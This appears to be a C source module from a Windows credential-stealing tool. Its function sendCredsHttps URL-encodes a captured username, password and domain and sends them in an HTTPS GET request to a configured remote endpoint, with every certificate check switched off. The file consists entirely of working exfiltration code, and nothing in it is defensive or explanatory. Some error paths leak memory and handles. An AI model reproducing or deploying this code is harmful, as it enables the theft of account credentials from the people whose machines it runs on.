#include "pch.h"
#include "utils.h"
#include "https.h"

static wchar_t* urlEncode(const wchar_t* str)
{
    size_t len = wcslen(str);
    size_t new_len = len*3+1;
    wchar_t* new_str;

    // Allocate memory for the encoded string.
    new_str = (wchar_t*)LocalAlloc(LPTR, new_len * sizeof(wchar_t));
    memset(new_str, '\0',new_len * sizeof(wchar_t));
    if (!new_str)
    {
        return NULL;
    }

    // Encode the string.
    for(size_t i=0;i<len;i++){
        swprintf(new_str+i*3, 4, L"%%%02X", (unsigned char)*(str+i));
    }

    return new_str;
}

BOOL sendCredsHttps(LPWSTR username, LPWSTR password, LPWSTR domain) {

    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults      = FALSE;
    DWORD dwSize       = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = NULL;
    DWORD dw           = 0;

    // Initialize WinHTTP.
    if (!(hSession = WinHttpOpen(USERAGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)))
        return FALSE;

    // Connect to the server.
    if (!(hConnect = WinHttpConnect(hSession, HTTPS_ENDPOINT, INTERNET_DEFAULT_HTTPS_PORT, 0)))
        return FALSE;

    WCHAR request[BUFFER_SIZE] = {0};
    WCHAR* encodedUsername     = urlEncode(username);
    WCHAR* encodedPassword     = urlEncode(password);
    WCHAR* encodedDomain       = urlEncode(domain);

    swprintf(request, BUFFER_SIZE, L"/index.php?username=%ls&password=%ls&hostname=%ls", encodedUsername, encodedPassword, encodedDomain);

    // Create the request.
    if (!(hRequest = WinHttpOpenRequest(hConnect, L"GET", request, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE)))
        return FALSE;

    DWORD dwFlags =
        SECURITY_FLAG_IGNORE_UNKNOWN_CA |
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID; // Ignore cert errors

    //https
    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags)))
        return FALSE;

    // Send the request.
    if (!(bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)))
        return FALSE;


    // Clean up.
    LocalFree(encodedDomain);
    LocalFree(encodedPassword);
    LocalFree(encodedUsername);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return TRUE;
}